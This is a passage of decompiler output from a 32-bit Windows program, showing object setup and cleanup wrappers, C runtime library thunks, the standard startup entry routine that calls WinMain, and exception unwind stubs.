  if (DAT_0040f938 == (char **)0x0) {
    puVar1 = (undefined4 *)operator_new(8);
    *puVar1 = 1;
    *(undefined4 **)(puVar1 + 1) = this_00;
  }
  else {
    if (this_00 != (undefined4 *)0x0) {
      FUN_00407572((int)this_00);
      operator_delete(this_00);
    }
    puVar1 = (undefined4 *)0x0;
  }
  *in_FS_OFFSET = *(undefined4 *)(unaff_EBP + -0xc);
  return puVar1;
}

undefined4 * __thiscall FUN_00407527(void *this,char *param_1) {
  size_t sVar1;
  char *_Dest;
  
  *(undefined4 *)((int)this + 4) = 0xffffffff;
  *(undefined4 *)((int)this + 0x134) = 0xffffffff;
  *(undefined4 *)this = 0;
  *(undefined4 *)((int)this + 0x138) = 0;
  *(undefined4 *)((int)this + 0x13c) = 0;
  if (param_1 != (char *)0x0) {
    sVar1 = strlen(param_1);
    _Dest = (char *)operator_new(sVar1 + 1);
    *(char **)((int)this + 0x138) = _Dest;
    strcpy(_Dest,param_1);
  }
  return (undefined4 *)this;
}

void __fastcall FUN_00407572(int param_1) {
  if (*(void **)(param_1 + 0x138) != (void *)0x0) {
    operator_delete(*(void **)(param_1 + 0x138));
  }
  *(undefined4 *)(param_1 + 0x138) = 0;
  if (*(void **)(param_1 + 0x13c) != (void *)0x0) {
    operator_delete(*(void **)(param_1 + 0x13c));
  }
  *(undefined4 *)(param_1 + 0x13c) = 0;
  return;
}

void FUN_004075ad(undefined4 param_1,undefined4 param_2,undefined4 param_3) {
  FUN_004074a4();
  return;
}

void __cdecl FUN_004075c4(int *param_1,char *param_2,undefined4 *param_3) {
  *param_3 = 0;
  *(undefined *)(param_3 + 1) = 0;
  param_3[0x4a] = 0;
  if (param_1 == (int *)0x0) {
    DAT_0040f938 = 0x10000;
  }
  else {
    if (*param_1 == 1) {
      DAT_0040f938 = FUN_00406c40((void *)param_1[1],param_2,param_3);
    }
    else {
      DAT_0040f938 = 0x80000;
    }
  }
  return;
}

void __cdecl FUN_00407603(int *param_1,char *param_2,char *param_3,void *param_4,int param_5) {
  if (param_1 == (int *)0x0) {
    DAT_0040f938 = 0x10000;
  }
  else {
    if (*param_1 == 1) {
      DAT_0040f938 = FUN_00407136((void *)param_1[1],param_2,param_3,param_4,param_5);
    }
    else {
      DAT_0040f938 = 0x80000;
    }
  }
  return;
}

void __cdecl FUN_0040763d(int *param_1,char *param_2,char *param_3) {
  FUN_00407603(param_1,param_2,param_3,(void *)0x0,2);
  return;
}

undefined4 __cdecl FUN_00407656(int *param_1) {
  void **ppvVar1;
  
  if (param_1 == (int *)0x0) {
    DAT_0040f938 = 0x10000;
  }
  else {
    if (*param_1 == 1) {
      ppvVar1 = (void **)param_1[1];
      DAT_0040f938 = FUN_0040747b(ppvVar1);
      if (ppvVar1 != (void **)0x0) {
        FUN_00407572((int)ppvVar1);
        operator_delete(ppvVar1);
      }
      operator_delete(param_1);
      return DAT_0040f938;
    }
    DAT_0040f938 = 0x80000;
  }
  return DAT_0040f938;
}

// WARNING: Exceeded maximum restarts with more pending

char * __cdecl strcpy(char *_Dest,char *_Source) {
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076a8. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = (char *)strcpy();
  return pcVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void * __cdecl memset(void *_Dst,int _Val,size_t _Size) {
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076ae. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)memset();
  return pvVar1;
}

// WARNING: Exceeded maximum restarts with more pending

size_t __cdecl strlen(char *_Str) {
  size_t sVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076b4. Too many branches
                    // WARNING: Treating indirect jump as call
  sVar1 = strlen();
  return sVar1;
}

void FUN_004076c8(void) {
  undefined4 in_FS_OFFSET;
  undefined auStack12 [12];
  
  *(undefined **)in_FS_OFFSET = auStack12;
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void __cdecl operator_delete(void *param_1) {
                    // WARNING: Could not recover jumptable at 0x004076e8. Too many branches
                    // WARNING: Treating indirect jump as call
  operator_delete();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

int __cdecl memcmp(void *_Buf1,void *_Buf2,size_t _Size) {
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x004076ee. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = memcmp();
  return iVar1;
}

void _local_unwind2(void) {
                    // WARNING: Could not recover jumptable at 0x004076fa. Too many branches
                    // WARNING: Treating indirect jump as call
  _local_unwind2();
  return;
}

// WARNING: Exceeded maximum restarts with more pending

void * __cdecl operator_new(uint param_1) {
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407700. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)operator_new();
  return pvVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void * __cdecl memcpy(void *_Dst,void *_Src,size_t _Size) {
  void *pvVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407706. Too many branches
                    // WARNING: Treating indirect jump as call
  pvVar1 = (void *)memcpy();
  return pvVar1;
}

// WARNING: Exceeded maximum restarts with more pending

int __cdecl strcmp(char *_Str1,char *_Str2) {
  int iVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407740. Too many branches
                    // WARNING: Treating indirect jump as call
  iVar1 = strcmp();
  return iVar1;
}

// WARNING: Exceeded maximum restarts with more pending

void _CxxThrowException(void *pExceptionObject,ThrowInfo *pThrowInfo) {
                    // WARNING: Could not recover jumptable at 0x0040776e. Too many branches
                    // WARNING: Treating indirect jump as call
  _CxxThrowException();
  return;
}

// Library Function - Single Match
// Name: __allmul
// Library: Visual Studio

ulonglong __allmul(uint param_1,uint param_2,uint param_3,uint param_4) {
  if ((param_4 | param_2) == 0) {
    return (ulonglong)param_1 * (ulonglong)param_3;
  }
  return (ulonglong)param_1 * (ulonglong)param_3 & 0xffffffff |
         (ulonglong)
         ((int)((ulonglong)param_1 * (ulonglong)param_3 >> 0x20) +
         param_2 * param_3 + param_1 * param_4) << 0x20;
}

// WARNING: Exceeded maximum restarts with more pending

char * __cdecl strcat(char *_Dest,char *_Source) {
  char *pcVar1;
  
                    // WARNING: Could not recover jumptable at 0x004077b4. Too many branches
                    // WARNING: Treating indirect jump as call
  pcVar1 = (char *)strcat();
  return pcVar1;
}

// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void entry(void) {
  undefined4 *puVar1;
  uint nCmdShow;
  HMODULE hInstance;
  undefined4 *in_FS_OFFSET;
  HINSTANCE hPrevInstance;
  PWSTR pCmdLine;
  PWSTR local_78;
  char **local_74;
  _startupinfo local_70;
  int local_6c;
  char **local_68;
  int local_64;
  _STARTUPINFOA local_60;
  undefined *local_1c;
  undefined4 uStack20;
  undefined *puStack16;
  undefined *puStack12;
  undefined4 local_8;
  
  puStack12 = &DAT_0040d488;
  puStack16 = &DAT_004076f4;
  uStack20 = *in_FS_OFFSET;
  *(undefined4 **)in_FS_OFFSET = &uStack20;
  local_1c = &stack0xffffff78;
  local_8 = 0;
  __set_app_type(2);
  _DAT_0040f94c = 0xffffffff;
  _DAT_0040f950 = 0xffffffff;
  puVar1 = (undefined4 *)__p__fmode();
  *puVar1 = DAT_0040f948;
  puVar1 = (undefined4 *)__p__commode();
  *puVar1 = DAT_0040f944;
  _DAT_0040f954 = *(undefined4 *)_adjust_fdiv_exref;
  FUN_0040793f();
  if (_DAT_0040f870 == 0) {
    __setusermatherr(&LAB_0040793c);
  }
  FUN_0040792a();
  _initterm(&DAT_0040e008,&DAT_0040e00c);
  local_70 = DAT_0040f940;
  __getmainargs(&local_64,&local_74,&local_68,_DoWildCard_0040f93c,&local_70);
  _initterm(&DAT_0040e000,&DAT_0040e004);
  local_78 = *(PWSTR *)_acmdln_exref;
  if (*(byte *)local_78 != 0x22) {
    do {
      if (*(byte *)local_78 < 0x21) goto LAB_004078ad;
      local_78 = (PWSTR)((int)local_78 + 1);
    } while( true );
  }
  do {
    local_78 = (PWSTR)((int)local_78 + 1);
    if (*(byte *)local_78 == 0) break;
  } while (*(byte *)local_78 != 0x22);
  if (*(byte *)local_78 != 0x22) goto LAB_004078ad;
  do {
    local_78 = (PWSTR)((int)local_78 + 1);
LAB_004078ad:
    pCmdLine = local_78;
  } while ((*(byte *)local_78 != 0) && (*(byte *)local_78 < 0x21));
  local_60.dwFlags = 0;
  GetStartupInfoA((LPSTARTUPINFOA)&local_60);
  if ((local_60.dwFlags & 1) == 0) {
    nCmdShow = 10;
  }
  else {
    nCmdShow = (uint)local_60.wShowWindow;
  }
  hPrevInstance = (HINSTANCE)0x0;
  hInstance = GetModuleHandleA((LPCSTR)0x0);
  local_6c = WinMain((HINSTANCE)hInstance,hPrevInstance,pCmdLine,nCmdShow);
                    // WARNING: Subroutine does not return
  exit(local_6c);
}

// WARNING: Exceeded maximum restarts with more pending

void __thiscall _type_info(type_info *this) {
                    // WARNING: Could not recover jumptable at 0x00407918. Too many branches
                    // WARNING: Treating indirect jump as call
  _type_info();
  return;
}

void _initterm(void) {
                    // WARNING: Could not recover jumptable at 0x00407924. Too many branches
                    // WARNING: Treating indirect jump as call
  _initterm();
  return;
}

void FUN_0040792a(void) {
  _controlfp(0x10000,0x30000);
  return;
}

void FUN_0040793f(void) {
  return;
}

// WARNING: Exceeded maximum restarts with more pending

uint __cdecl _controlfp(uint _NewValue,uint _Mask) {
  uint uVar1;
  
                    // WARNING: Could not recover jumptable at 0x00407940. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = _controlfp();
  return uVar1;
}

void Unwind_00407950(void) {
  int unaff_EBP;
  
  FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
  return;
}

void Unwind_0040795b(void) {
  int unaff_EBP;
  
  FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x2c));
  return;
}

void Unwind_00407970(void) {
  int unaff_EBP;
  
  FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 4));
  return;
}

void Unwind_0040797b(void) {
  int unaff_EBP;
  
  FUN_0040181b((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x2c));
  return;
}

void Unwind_00407986(void) {
  int unaff_EBP;
  
  FUN_00402a6f((undefined4 *)(*(int *)(unaff_EBP + -0x10) + 0x54));
  return;
}

void Unwind_0040799c(void) {
  int unaff_EBP;
  
  operator_delete(*(void **)(unaff_EBP + -0x10));
  return;
}